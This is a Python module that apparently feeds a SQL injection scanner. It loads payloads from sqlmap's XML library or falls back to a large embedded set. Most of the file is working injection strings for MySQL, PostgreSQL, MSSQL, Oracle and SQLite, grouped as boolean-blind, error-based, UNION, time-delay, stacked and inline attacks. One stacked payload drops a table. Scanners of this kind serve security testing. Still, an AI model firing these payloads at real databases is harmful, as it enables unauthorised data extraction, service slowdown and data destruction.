"""
Load SQL injection payloads from sqlmap's XML payload library.

Falls back to a comprehensive embedded set when sqlmap is not installed.
sqlmap XML files live at:  <sqlmap_root>/data/xml/payloads/*.xml
"""

import os
import random
import re
import shutil
from pathlib import Path
from typing import Optional


# ── Embedded payload set (covers all sqlmap techniques) ──────────────────────

PAYLOADS_BOOLEAN_BLIND = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "\" AND \"1\"=\"1",
    "\" AND \"1\"=\"2",
    " AND 1=1",
    " AND 1=2",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR '1'='1",
    "' OR '1'='2",
    "\" OR \"1\"=\"1",
    " OR 1=1",
    " OR 1=2",
    "1 OR 1=1",
    "') AND ('1'='1",
    "') AND ('1'='2",
    "')) AND (('1'='1",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' OR '1'='1",
    "1 AND 1=1--",
    "1 AND 1=2--",
    "1)) AND ((1=1",
    "1)) AND ((1=2",
    "'||'1'='1",
    "'||'1'='2",
]

PAYLOADS_ERROR_BASED = [
    # Generic quote error trigger
    "'",
    "\"",
    "\\",
    "')",
    "\")",
    "'))",
    # PostgreSQL
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)",
    "1'; SELECT 1/0--",
    # MySQL
    "' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version()))s),8446744073709551610,8446744073709551610)))--",
    "1 AND EXTRACTVALUE(0,CONCAT(0x7e,database()))--",
    # MSSQL
    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; SELECT 1--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    # Oracle
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance))--",
    "' UNION SELECT NULL FROM dual--",
    # SQLite
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
    "1 AND sqlite_version()>0--",
]

PAYLOADS_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    " UNION SELECT NULL--",
    " UNION SELECT NULL,NULL--",
    " UNION ALL SELECT NULL--",
    " UNION ALL SELECT NULL,NULL--",
    " UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3--",
    "1 UNION SELECT NULL--",
    "1 UNION ALL SELECT NULL,NULL--",
    "-1 UNION SELECT 1,2,3--",
    "-1 UNION ALL SELECT NULL,NULL,NULL--",
    "') UNION SELECT NULL--",
    "') UNION SELECT NULL,NULL--",
    "')) UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL FROM dual--",   # Oracle
    "' UNION SELECT NULL,NULL FROM dual--",
]

PAYLOADS_TIME_BLIND = [
    # MySQL
    "' AND SLEEP(3)--",
    "\" AND SLEEP(3)--",
    " AND SLEEP(3)--",
    "1 AND SLEEP(3)--",
    "' OR SLEEP(3)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(3)))b)--",
    # PostgreSQL
    "'; SELECT pg_sleep(3)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
    "\" AND 1=(SELECT 1 FROM pg_sleep(3))--",
    "1; SELECT pg_sleep(3)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:3'--",
    "\" WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND 1=1; WAITFOR DELAY '0:0:3'--",
    # SQLite
    "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    # Generic heavy query
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

PAYLOADS_STACKED = [
    "'; SELECT 1--",
    "\"; SELECT 1--",
    "'; SELECT SLEEP(1)--",
    "'; WAITFOR DELAY '0:0:1'--",
    "'; SELECT pg_sleep(1)--",
    "1; SELECT 1--",
    "1'; SELECT 1--",
    "1'; DROP TABLE IF EXISTS llmsql_test--",
    "'); SELECT 1--",
]

PAYLOADS_INLINE = [
    "(SELECT 1)",
    "(SELECT version())",
    "+(SELECT 0 FROM (SELECT SLEEP(0))a)+",
    "(SELECT CONCAT(table_name) FROM information_schema.tables LIMIT 1)",
]

ALL_EMBEDDED: list[str] = (
    PAYLOADS_ERROR_BASED          # error-based first (fastest detection)
    + PAYLOADS_BOOLEAN_BLIND
    + PAYLOADS_UNION
    + PAYLOADS_TIME_BLIND
    + PAYLOADS_STACKED
    + PAYLOADS_INLINE
)


# ── sqlmap XML loader ─────────────────────────────────────────────────────────

_RAND_PAT = re.compile(r"\[RAND(NUM|STR)\d*\]", re.IGNORECASE)
_SLEEP_PAT = re.compile(r"\[SLEEPTIME\]", re.IGNORECASE)
_DELAY_PAT = re.compile(r"\[DELAYED\]", re.IGNORECASE)


def _substitute(payload: str, sleep: int = 3) -> str:
    """Replace sqlmap template tokens with concrete values."""
    result = _RAND_PAT.sub(lambda m: str(random.randint(1000, 9999)), payload)
    result = _SLEEP_PAT.sub(str(sleep), result)
    result = _DELAY_PAT.sub(f"0:0:{sleep}", result)
    return result


def _find_sqlmap_data_dir(hint: Optional[str] = None) -> Optional[Path]:
    """Locate sqlmap's data/xml/payloads directory."""
    if hint:
        p = Path(hint)
        if p.is_dir():
            return p

    # Check SQLMAP_HOME env
    home = os.environ.get("SQLMAP_HOME")
    if home:
        candidate = Path(home) / "data" / "xml" / "payloads"
        if candidate.is_dir():
            return candidate

    # Walk up from sqlmap binary
    binary = shutil.which("sqlmap")
    if binary:
        # Resolve symlinks
        binary = os.path.realpath(binary)
        for parent in [Path(binary).parent, Path(binary).parent.parent]:
            candidate = parent / "data" / "xml" / "payloads"
            if candidate.is_dir():
                return candidate

    # Common install locations
    for base in [
        Path("/usr/share/sqlmap"),
        Path("/usr/local/share/sqlmap"),
        Path(os.path.expanduser("~/.local/share/sqlmap")),
        Path(os.path.expanduser("~/sqlmap")),
        Path(os.path.expanduser("~/tools/sqlmap")),
    ]:
        candidate = base / "data" / "xml" / "payloads"
        if candidate.is_dir():
            return candidate

    return None


def _parse_xml_payloads(xml_path: Path, sleep: int = 3) -> list[str]:
    """Extract payload strings from a sqlmap XML payload file."""
    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(xml_path)
        root = tree.getroot()
        results = []
        for test in root.findall("test"):
            # <request><payload>...</payload></request> in newer versions
            for elem in test.iter("payload"):
                text = (elem.text or "").strip()
                if text:
                    results.append(_substitute(text, sleep))
            # Some versions have <payload> directly under <test>
        return results
    except Exception:
        return []


def load_sqlmap_payloads(
    data_dir: Optional[str] = None,
    sleep: int = 3,
) -> tuple[list[str], str]:
    """
    Return (payloads, source_description).

    Tries to read sqlmap's XML library; falls back to the embedded set.
    """
    sqlmap_dir = _find_sqlmap_data_dir(data_dir)
    if sqlmap_dir:
        payloads: list[str] = []
        for xml_file in sorted(sqlmap_dir.glob("*.xml")):
            payloads.extend(_parse_xml_payloads(xml_file, sleep))
        # Remove duplicates preserving order
        seen: set[str] = set()
        unique = [p for p in payloads if p not in seen and not seen.add(p)]  # type: ignore[func-returns-value]
        if unique:
            return unique, f"sqlmap ({len(unique)} payloads from {sqlmap_dir})"

    return list(ALL_EMBEDDED), f"embedded ({len(ALL_EMBEDDED)} payloads)"


def get_payloads(
    data_dir: Optional[str] = None,
    sleep: int = 3,
    techniques: Optional[list[str]] = None,
) -> list[str]:
    """
    Return deduplicated payload list for scanning.

    techniques: subset of ['error','boolean','union','time','stacked']
    """
    if techniques:
        mapping = {
            "error": PAYLOADS_ERROR_BASED,
            "boolean": PAYLOADS_BOOLEAN_BLIND,
            "union": PAYLOADS_UNION,
            "time": PAYLOADS_TIME_BLIND,
            "stacked": PAYLOADS_STACKED,
        }
        payloads = []
        for t in techniques:
            payloads.extend(mapping.get(t, []))
        if payloads:
            return payloads

    payloads, _ = load_sqlmap_payloads(data_dir, sleep)
    return payloads
